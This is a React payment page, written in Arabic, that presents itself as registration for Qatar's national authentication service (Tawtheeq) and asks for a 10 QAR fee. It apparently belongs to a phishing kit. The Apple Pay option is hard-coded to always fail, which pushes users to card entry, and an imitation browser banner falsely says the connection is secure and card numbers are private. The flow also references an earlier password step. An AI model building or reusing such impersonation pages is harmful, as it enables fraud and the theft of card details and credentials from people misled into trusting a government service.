import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

const Payment = () => {
  const navigate = useNavigate();
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState("");
  const [showApplePayError, setShowApplePayError] = useState(false);

  const handlePaymentMethodChange = (method) => {
    setSelectedPaymentMethod(method);
    if (method === "applePay") {
      setShowApplePayError(true);
    } else {
      setShowApplePayError(false);
    }
  };

  const handleContinue = () => {
    if (selectedPaymentMethod === "bankCard") {
      // Navigate to payment summary page
    window.location.href = '/payment';
    }
  };

  const handleBack = () => {
    navigate("/password");
  };

  const isFormValid = selectedPaymentMethod === "bankCard";

  return (
    <div className="bg-gray-50 flex flex-col w-full min-h-screen" dir="rtl">
      {/* Header */}
      <div className="w-full bg-white pt-4 px-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center justify-between relative flex-row-reverse w-full">
            {/* Step 4 - Active */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-0 right-1/2 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full bg-[#0071bc] flex items-center justify-center text-white font-bold z-10">
                  4
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-800">
                  إنتهاء
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-800">
                  التسجيل
                </p>
              </div>
            </div>

            {/* Step 3 */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-1/2 right-1/2 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full border-2 border-gray-300 bg-white flex items-center justify-center text-gray-400 font-bold z-10">
                  3
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  كلمة
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  المرور
                </p>
              </div>
            </div>

            {/* Step 2 */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-1/2 right-1/2 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full border-2 border-gray-300 bg-white flex items-center justify-center text-gray-400 font-bold z-10">
                  2
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  البيانات
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  الشخصية
                </p>
              </div>
            </div>

            {/* Step 1 */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-1/2 right-0 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full border-2 border-gray-300 bg-white flex items-center justify-center text-gray-400 font-bold z-10">
                  1
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  نوع
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  الحساب
                </p>
              </div>
            </div>
            <div className="absolute h-0.5 top-5 w-full bg-gray-200"></div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 container mx-auto px-4 py-3">
        <div className="text-right ">
          <h2 className="text-2xl md:text-3xl font-bold text-gray-800">
            تسديد الرسوم
          </h2>
          <div className="border-b-2 border-dotted border-gray-400 mt-4"></div>
        </div>
        <div className="mx-auto  rounded-lg shadow-lg py-4 px-4">
          {/* Title */}

          {/* Information Section */}
          <div className="bg-white rounded-lg mb-4 text-right">
            <p className="text-gray-800 leading-relaxed mb-6">
              سيتم استيفاء مبلغ ( 10 ر.ق ) بدل رسوم تسجيل لإتمام عملية التسجيل
              في نظام التوثيق الوطني ( توثيق ) للاستفادة من المزايا المقدمة من
              خدمات نظام التوثيق الوطني :
            </p>

            <p className="text-gray-800 font-bold mb-4">
              وتتمتع خدمة التوثيق الوطني بالمزايا التالية:
            </p>

            <ul className="space-y-3 text-gray-800 mr-4">
              <li className="flex items-start gap-2">
                <span className="mt-1.5 w-2 h-2 bg-black rounded-full flex-shrink-0"></span>
                <span>
                  تسهيل ربط الجهات الحكومية بالخدمة من خلال إجراءات مبسطة.
                </span>
              </li>
              <li className="flex items-start gap-2">
                <span className="mt-1.5 w-2 h-2 bg-black rounded-full flex-shrink-0"></span>
                <span>
                  تأمين استخدام الخدمات الإلكترونية والعمليات من قبل المستخدمين.
                </span>
              </li>
              <li className="flex items-start gap-2">
                <span className="mt-1.5 w-2 h-2 bg-black rounded-full flex-shrink-0"></span>
                <span>
                  توفير توثيق متعدد المستويات باستخدام (البطاقة الذكية/ كلمة
                  السر أو كلمة المرور/ البريد الإلكتروني للزائرين أو ذوي الإقامة
                  المؤقتة القصيرة).
                </span>
              </li>
              <li className="flex items-start gap-2">
                <span className="mt-1.5 w-2 h-2 bg-black rounded-full flex-shrink-0"></span>
                <span>
                  ضمان تسجيل الدخول الموحد للحساب مما يسهل تجربة العمل عند إتمام
                  أي خدمة أو معاملة إلكترونية.
                </span>
              </li>
            </ul>
          </div>

          {/* Payment and Registration Section */}
          <div className="text-right ">
            <h3 className="text-xl md:text-2xl font-bold text-gray-800">
              الدفع والتسديد
            </h3>
            <div className="border-b-2 border-dotted border-gray-400 mt-4"></div>
          </div>

          <div className=" mt-2">
            {/* Payment Methods */}
            <div>
              <label className="text-lg font-bold text-gray-800 mb-2 block text-right">
                آلية الدفع <span className="text-red-600">*</span>
              </label>

              <div className="space-y-4">
                {/* Apple Pay Option */}
                <label className="flex items-center justify-between gap-3 cursor-pointer bg-white p-4 rounded-lg border border-gray-300">
                  <div className="flex items-center gap-3">
                    <input
                      type="radio"
                      name="paymentMethod"
                      value="applePay"
                      checked={selectedPaymentMethod === "applePay"}
                      onChange={() => handlePaymentMethodChange("applePay")}
                      className="w-6 h-6 cursor-pointer"
                    />
                    <span className="text-gray-800 font-bold text-sm">
                      التسديد عبر أبل باي
                    </span>
                  </div>
                  <img src="/apple.avif" />
                </label>

                {/* Apple Pay Error Message */}
                {showApplePayError && (
                  <div className="bg-red-50 border border-red-300 rounded-lg p-4 text-right">
                    <p className="text-red-700 font-bold">
                      عذراً، Apple Pay غير متاح حالياً
                    </p>
                    <p className="text-red-600 text-sm mt-1">
                      يرجى اختيار طريقة دفع أخرى
                    </p>
                  </div>
                )}

                {/* Bank Card Option */}
                <label className="flex items-center justify-between gap-3 cursor-pointer bg-white p-4 rounded-lg border border-gray-300">
                  <div className="flex items-center gap-3">
                    <input
                      type="radio"
                      name="paymentMethod"
                      value="bankCard"
                      checked={selectedPaymentMethod === "bankCard"}
                      onChange={() => handlePaymentMethodChange("bankCard")}
                      className="w-6 h-6 cursor-pointer"
                    />
                    <span className="text-gray-800 font-bold text-sm" >
                      التسديد عبر البطاقة المصرفية
                    </span>
                  </div>
                  <div className="flex gap-2">
                    <img src="/visa_master.avif" />
                  </div>
                </label>
              </div>

              {/* Security Message */}
              <div className="mt-4 bg-white rounded-lg p-2 border border-green-300" dir="ltr">
                <p className="text-green-700 font-bold mb-1">
                  Connection is secure
                </p>
                <p className="text-sm text-gray-600">
                  Your <span className="text-orange-600">information</span> (
                  for example, passwords or credit card numbers ) is{" "}
                  <span className="text-green-600">private</span> when it is
                  sent to this site.
                </p>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="flex flex-row-reverse gap-6 justify-center mt-4 ">
              <button
                onClick={handleContinue}
                disabled={!isFormValid}
                className={`font-bold py-2 px-16 rounded-lg text-xl transition-colors ${
                  isFormValid
                    ? "bg-[#3c96c4] hover:bg-[#2d7fa8] text-white cursor-pointer"
                    : "bg-gray-300 text-gray-500 cursor-not-allowed"
                }`}
              >
                استمر
              </button>
              <button
                onClick={handleBack}
                className="bg-white hover:bg-gray-100 text-gray-800 font-bold py-2 px-16 rounded-lg text-xl border-2 border-gray-300 transition-colors"
              >
                رجوع
              </button>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Payment;
